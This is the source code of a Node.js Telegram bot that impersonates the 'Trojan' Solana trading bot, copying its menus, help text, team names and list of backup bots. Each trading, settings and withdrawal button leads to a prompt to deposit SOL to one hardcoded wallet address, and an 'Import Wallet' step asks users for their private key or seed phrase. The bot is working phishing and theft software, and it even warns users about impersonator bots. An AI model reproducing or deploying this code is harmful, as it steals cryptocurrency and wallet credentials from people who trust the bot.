const { Telegraf } = require("telegraf");
require("dotenv").config();
const express = require("express");
const tokenDetails = require("./tokenDetails");
const app = express();
const fs = require("fs");
const bodyParser = require("body-parser")

const bot = new Telegraf(process.env.BOT_TOKEN);

app.use(bodyParser.json())

app.get("/", (req, res) => {
  res.send("Hello world trojan - paris");
});

const port = process.env.PORT || 5000

app.listen(port, ()=>{
    console.log(`Listening on port ${port}`)
})

let privateKeyEntry = false;

const startMenu = (ctx, isEditing = false) => {
  replyText = `
*Solana* · [🅴](https://solscan.io/account/2qBi9NZizBkS1tn6GjKwzL6yBkU2nY6ivs4d3bXfzKeE)
\`2qBi9NZizBkS1tn6GjKwzL6yBkU2nY6ivs4d3bXfzKeE\`  _(Tap to copy)_
Balance \`0 SOL ($0.00)\`
    
Click on the Refresh button to update your current balance.
    
Join our Telegram group [@trojan_on_solana](t.me/trojan_on_solana) for users of Trojan!
    
Once done tap refresh and your balance will appear here.
    
For more info on your wallet and to import your private key, tap the BUY button below. We guarantee the safety of user funds on Trojan Bot.
    
💡If you aren't already, we advise that you *use any of the following bots to trade with.* You will have the *same wallets and settings across all bots,* but it will be significantly faster due to lighter user load.
[Achilles](https://t.me/achilles_solanabot) | [Odysseus](https://t.me/odysseus_solanabot) | [Menelaus](https://t.me/menelaus_solanabot) | [Diomedes](https://t.me/diomedes_solanabot) | [Paris](https://t.me/paris_solanabot) | [Helenus](https://t.me/helenus_solanabot) | [Hector](https://t.me/hector_solanabot)`;

  const replyMarkup = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "Buy", callback_data: "buy" },
          { text: "Sell", callback_data: "sell" },
        ],
        [
          { text: "Positions", callback_data: "sell" },
          { text: "Limit Orders", callback_data: "limit-orders" },
          { text: "DCA Orders", callback_data: "dca" },
        ],
        [
          { text: "Copy Trade", callback_data: "sell" },
          { text: "LP Sniper 🔜", callback_data: "sell" },
        ],

        [
          { text: "New Pairs", url: "https://t.me/NewPairsSolana" },
          { text: "💰 Referrals", callback_data: "referrals" },
          { text: "Settings", callback_data: "settings" },
        ],

        [
          { text: "Bridge", callback_data: "deposit-2" },
          { text: "Withdraw", callback_data: "deposit-2" },
        ],

        [
          { text: "Help", callback_data: "help" },
          { text: "Refresh", callback_data: "b-4" },
        ],
      ],
    },
  };

  if (isEditing) {
    return ctx.editMessageText(replyText, {
      ...replyMarkup,
      reply_to_message_id: ctx.message_id,
      parse_mode: "Markdown",
      disable_web_page_preview: true,
    });
  }

  //Sends this if editing == false
  ctx.reply(replyText, {
    ...replyMarkup,
    reply_to_message_id: ctx.message.message_id,
    parse_mode: "Markdown",
    disable_web_page_preview: true,
  });
};

const formatValue = (value) => {
  if (value >= 1e9) {
    // Billion
    return "$" + (value / 1e9).toFixed(2) + "B";
  } else if (value >= 1e6) {
    // Million
    return "$" + (value / 1e6).toFixed(2) + "M";
  } else if (value >= 1e3) {
    // Thousand
    return "$" + (value / 1e3).toFixed(2) + "K";
  } else {
    return "$" + value.toFixed(2);
  }
};

//Fetches token details of user-inputed token address
const fetchTokenDetails = async (ctx, userMessage) => {
  const results = await tokenDetails(userMessage);

  // return if token isn't found
  if (!results.success) {
    return ctx.reply("Token not found", {
      reply_markup: {
        inline_keyboard: [[{ text: "Retry", callback_data: "buy" }]],
      },
    });
  }

  // Display token details
  let tokenData = results.data.pairs[0];
  let tokenName = tokenData.baseToken.name;
  let tokenSymbol = tokenData.baseToken.symbol;
  let tokenAddress = tokenData.baseToken.address;
  let priceUSD = tokenData.priceUsd;
  let liquidityUSD = formatValue(tokenData.liquidity.usd);

  replyText = `
*Buy* $*${tokenSymbol.toUpperCase()}* — (${tokenName}) 📈
\`${tokenAddress}\`
[Share token with your Reflink](https://t.me/solana_trojanbot?start=r-${
    ctx.message.from.username
  }-${tokenAddress}/)
    
Balance: ░░░░░░
Price: *${priceUSD}* — LIQ: *${liquidityUSD}*
Renounced ✅
    
🔴 _Insufficient balance for buy amount + gas_ ⇅
    
To buy send SOL to your trojan wallet
\`2qBi9NZizBkS1tn6GjKwzL6yBkU2nY6ivs4d3bXfzKeE\`
`;

  const replyMarkup = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "Close", callback_data: "delete-message" }],
        [{ text: "Deposit SOL", callback_data: "deposit-sol" }],
        [{ text: "Import Wallet", callback_data: "import-w" }],
      ],
    },
  };

  ctx.reply(replyText, {
    ...replyMarkup,
    reply_to_message_id: ctx.message.message_id,
    parse_mode: "Markdown",
    disable_web_page_preview: true,
  });
};

const handleBuyAction = (ctx) => {
  ctx.reply("Enter a token address to buy");
};

// handles close action
bot.action("delete-message", (ctx) => {
  ctx.deleteMessage();
});

// handles deposit-sol action
bot.action("deposit-sol", (ctx) => {
  replyText = `
To deposit send SOL to your address provided below ⬇️:

\`2qBi9NZizBkS1tn6GjKwzL6yBkU2nY6ivs4d3bXfzKeE\`
`;

  ctx.reply(replyText, { parse_mode: "Markdown" });
});

// handles import-wallet action
bot.action("import-w", (ctx) => {
  replyText = `
What's the private key or seed phrase of the wallet that you want to import?.

Phantom Wallet, Solflare Wallet, or any other trading bots such as Bonkbot and Solareum are accepted.
    
Please enter it below ⬇️
`;

  ctx.reply(replyText);
});

const handleNoTokens = (ctx, buttonPressed = false, customText = "") => {
  replyText =
    customText.length > 0
      ? customText
      : `*You do not have any tokens yet! Start trading in the Buy menu.*`;
  const replyMarkup = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "← Back", callback_data: "back-to-menu" },
          { text: "↻ Refresh", callback_data: "--" },
        ],
      ],
    },
  };

  if (buttonPressed) {
    return ctx.editMessageText(replyText, {
      ...replyMarkup,
      reply_to_message_id: ctx.message_id,
      parse_mode: "Markdown",
      disable_web_page_preview: true,
    });
  }

  ctx.reply(replyText, {
    ...replyMarkup,
    reply_to_message_id: ctx.message_id,
    parse_mode: "Markdown",
    disable_web_page_preview: true,
  });
};

// handles /backup command
bot.command("backup", async (ctx) => {
replyText = `
The following backup bots are available. These bots give access to exactly the same Trojan wallet, token positions, and settings. 

The backup bots are often faster due to a lighter user load. If you're ever having trouble with the primary [@solana_trojanbot](t.me/trojan_soIanabot.) jump into one of the backups!

🟢 - Best option with lightest load
🟡 - Bot is under moderate load
🔴 - Worst option due to heavy load

⚠️ Do not try to search our bot usernames in Telegram because there are scam impersonator bots. Click our official links only.
`

const replyMarkup = {
    reply_markup:{
        inline_keyboard:[
            [{text:"🟢 Achilles", callback_url:"t.me/achilles_solanabot"}],
            [{text:"🟡 Odysseus", callback_url:"t.me/odysseus_solanabot"}],
            [{text:"🟢 Menelaus", callback_url:"t.me/menelaus_solanabot"}],
            [{text:"🟡 Diomedes", callback_url:"t.me/diomedes_solanabot"}],
            [{text:"🔴 Paris", callback_url:"t.me/paris_solanabot"}],
            [{text:"🟡 Helenus", callback_url:"t.me/helenus_solanabot"}],
            [{text:"🟡 Hector", callback_url:"t.me/hector_solanabot"}],
            [{text:"✖️ Close", callback_data:"delete-message"}],
        ]
    }
}

ctx.reply(replyText, {
    ...replyMarkup,
    parse_mode: "Markdown",
    disable_web_page_preview: true,
  });
});

// handles /buy command
bot.command("buy", async (ctx) => {
  handleBuyAction(ctx);
});

// handles buy callback
bot.action("buy", async (ctx) => {
  handleBuyAction(ctx);
});

// handles back to menu callback
bot.action("back-to-menu", async (ctx) => {
  startMenu(ctx, true);
});

// handles /sell command
bot.command("sell", async (ctx) => {
  handleNoTokens(ctx);
});

// handles sell callback
bot.action("sell", async (ctx) => {
  handleNoTokens(ctx, true);
});

// handles /positions command
bot.command("positions", async (ctx) => {
  handleNoTokens(ctx);
});

// handles /referrals command
bot.action("referrals", (ctx) => {
  // Read the image file
  const photo = fs.readFileSync("image.jpg");

  // Define the caption with Markdown formatting
  const caption = `
💰 *Invite your friends to save 10% on fees. If you've traded more than $10k volume in a week you'll receive a 35% share of the fees paid by your referrees! Otherwise, you'll receive a 25% share.*
  
*Your Referrals (updated every 15 min)*
• Users referred: 0 (direct: 0, indirect: 0)
• Total rewards: 0 SOL ($0.00)
• Total paid: 0 SOL ($0.00)
• Total unpaid: 0 SOL ($0.00)
  
Rewards are paid daily and airdropped directly to your chosen Rewards Wallet. *You must have accrued at least 0.005 SOL in unpaid fees to be eligible for a payout.*
  
We've established a tiered referral system, ensuring that as more individuals come onboard, rewards extend through five different layers of users. This structure not only benefits community growth but also significantly increases the percentage share of fees for everyone.
  
Stay tuned for more details on how we'll reward active users and happy trading!
  
*Your Referral Link*
\`https://t.me/solana_trojanbot?start=r-${ctx.from?.username?.toLowerCase()}\`
  `;

  const replyMarkup = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "Close", callback_data: "delete-message" }],
        [
          {
            text: "Rewards Wallet: 7K73...Gvnt",
            callback_data: "delete-message",
          },
        ],
      ],
    },
  };

  // Send the message with image, caption, and buttons
  ctx.replyWithPhoto(
    { source: photo },
    { caption, parse_mode: "Markdown", ...replyMarkup }
  );
});

// handles positions callback
bot.action("positions", async (ctx) => {
  handleNoTokens(ctx, true);
});

// handles positions callback
bot.action("limit-orders", async (ctx) => {
  handleNoTokens(
    ctx,
    true,
    "*You have no active limit orders. Create a limit order from the Buy/Sell menu.*"
  );
});

// handles positions callback
bot.action("dca", async (ctx) => {
  handleNoTokens(
    ctx,
    true,
    "*You have no active DCA orders. Create a DCA order from the Buy/Sell menu.*"
  );
});

const deposit = (ctx, isCommand = false, settings = false) => {
  const replyText = `
*Deposit SOL in your wallet address below to ${
    settings ? `update settings.` : `continue.`
  }*

\`2qBi9NZizBkS1tn6GjKwzL6yBkU2nY6ivs4d3bXfzKeE\` _(Tap to copy)_
`;
  const replyMarkup = {
    reply_markup: {
      inline_keyboard: [[{ text: "← Back", callback_data: "back-to-menu" }]],
    },
  };

  if (isCommand) {
    return ctx.reply(replyText, { ...replyMarkup, parse_mode: "Markdown" });
  }

  ctx.editMessageText(replyText, {
    ...replyMarkup,
    reply_to_message_id: ctx.message_id,
    parse_mode: "Markdown",
  });
};

//handles withdraw
bot.command("withdraw", (ctx) => {
  deposit(ctx, true);
});

//handles deposit-2(deposit to continue)
bot.action("deposit-2", (ctx) => {
  deposit(ctx);
});

//handles deposit(deposit for settings)
bot.action("deposit", (ctx) => {
  deposit(ctx, false, true);
});

const showHelp = (ctx, isCommand = false) => {
  const replyText = `
*Support Page* - [Terms of Service](https://tos.unibotlabs.com/)

*How do I use Trojan?*
Check out our [Youtube playlist](https://www.youtube.com/playlist?list=PLlwrjFNo98DR4dpHH8Y9s6ms5jNOyXTHp) where we explain it all.
    
*Which tokens can I trade?*
Any SPL token that is tradeable via Jupiter, including SOL and USDC pairs. We also support directly trading through Raydium if Jupiter fails to find a route. You can trade newly created SOL pairs (not USDC) directly through Raydium.
    
*Where can I find my referral code?*
Open the /start menu and click 💰Referrals.
    
*My transaction timed out. What happened?*
Transaction timeouts can occur when there is heavy network load or instability. This is simply the nature of the current Solana network.
    
*What are the fees for using Trojan?*
Transactions through Trojan incur a fee of 1%, or 0.9% if you were referred by another user. We don't charge a subscription fee or pay-wall any features.
    
*My net profit seems wrong, why is that?*
The net profit of a trade takes into consideration the trade's transaction fees. Confirm the details of your trade on Solscan.io to verify the net profit.
    
*Who is the team?*
Trojan on Solana is developed and overseen by Primordium Labs.
Lead Team: @mikebot3000 @TheDonDonnie @Reethmos.
    
*Additional questions or need support?*
Join our Telegram group [@trojan_on_solana](t.me/trojan_on_solana) and one of our admins can assist you.
`;

  const replyMarkup = {
    reply_markup: {
      inline_keyboard: [[{ text: "← Back", callback_data: "back-to-menu" }]],
    },
  };

  if (isCommand) {
    return ctx.reply(replyText, {
      ...replyMarkup,
      parse_mode: "Markdown",
      disable_web_page_preview: true,
    });
  }

  ctx.editMessageText(replyText, {
    ...replyMarkup,
    reply_to_message_id: ctx.message_id,
    parse_mode: "Markdown",
    disable_web_page_preview: true,
  });
};

const showSettings = (ctx, isCommand = false) => {
  const replyText = `
*FAQ:*

🚀*Fast/Turbo/Custom Fee:* Set your preferred priority fee to decrease likelihood of failed transactions.
    
🛡️*MEV Protection:*
Enable this setting to send transactions privately and avoid getting frontrun or sandwhiched. The MEV Tip is paid to the 
validator to incentivise the inclusion of your transaction, and only paid if MEV protection is enabled.
Important Note: If you enable MEV Protection your transactions may take longer to get confirmed.
`;

  const replyMarkup = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "← Back", callback_data: "back-to-menu" },
          { text: "🇸 → 🇨🇳", callback_data: "deposit" },
        ],
        [
          { text: "✅ Fast 🦄", callback_data: "deposit" },
          { text: "Turbo 🚀", callback_data: "deposit" },
          { text: "Custom Fee", callback_data: "deposit" },
        ],

        [{ text: "🔴 Auto Buy", callback_data: "deposit" }],

        [
          { text: "0.5 SOL✏️", callback_data: "deposit" },
          { text: "1 SOL✏️", callback_data: "deposit" },
          { text: "3 SOL✏️", callback_data: "deposit" },
        ],

        [
          { text: "5 SOL✏️", callback_data: "deposit" },
          { text: "10 SOL✏️", callback_data: "deposit" },
        ],

        [{ text: "Buy Slippage: 15%✏️", callback_data: "deposit" }],

        [{ text: "🔴 MEV Protect (Buys)", callback_data: "deposit" }],

        [
          { text: "50%✏️", callback_data: "deposit" },
          { text: "100%✏️", callback_data: "deposit" },
        ],

        [{ text: "Sell Slippage: 15%✏️", callback_data: "deposit" }],

        [{ text: "🔴 MEV Protect (Sells)", callback_data: "deposit" }],
        [
          { text: "Show/Hide Tokens", callback_data: "deposit" },
          { text: "Wallets", callback_data: "deposit" },
        ],

        [{ text: "Advanced Mode →", callback_data: "deposit" }],
      ],
    },
  };

  if (isCommand) {
    return ctx.reply(replyText, {
      ...replyMarkup,
      parse_mode: "Markdown",
      disable_web_page_preview: true,
    });
  }

  ctx.editMessageText(replyText, {
    ...replyMarkup,
    reply_to_message_id: ctx.message_id,
    parse_mode: "Markdown",
    disable_web_page_preview: true,
  });
};

//handles /help command
bot.command("help", (ctx) => {
  showHelp(ctx, true);
});

//handles /help callback
bot.action("help", (ctx) => {
  showHelp(ctx);
});

//handles /settings command
bot.command("settings", (ctx) => {
  showSettings(ctx, true);
});

//handles /settings callback
bot.action("settings", (ctx) => {
  showSettings(ctx);
});

// responds to /start command
bot.start(async (ctx) => {
  startMenu(ctx);
});

//Respond to user text entry
bot.on("message", async (ctx) => {
  if (!ctx.message.text.trim()) return;

  const userMessage = ctx.message.text.trim();

  if (userMessage == "/start") {
    // Ignore handling /start command
    return;
  }

  if (!privateKeyEntry) {
    await fetchTokenDetails(ctx, userMessage);
  }
});

//sets bot commands menu
bot.telegram.setMyCommands([
  { command: "start", description: "Trade on Solana with Trojan" },
  {
    command: "buy",
    description: "Buy a token",
  },

  {
    command: "sell",
    description: "Sell a token",
  },

  {
    command: "positions",
    description: "View detailed information about your holdingsn",
  },

  {
    command: "settings",
    description: "Configure your settings",
  },

  {
    command: "withdraw",
    description: "Withdraw tokens, SOL or ETH",
  },

  {
    command: "help",
    description: "FAQ and Telegram channel",
  },

  {
    command: "backup",
    description: "Backup bots in case of lag or issues",
  },
]);

bot.launch();
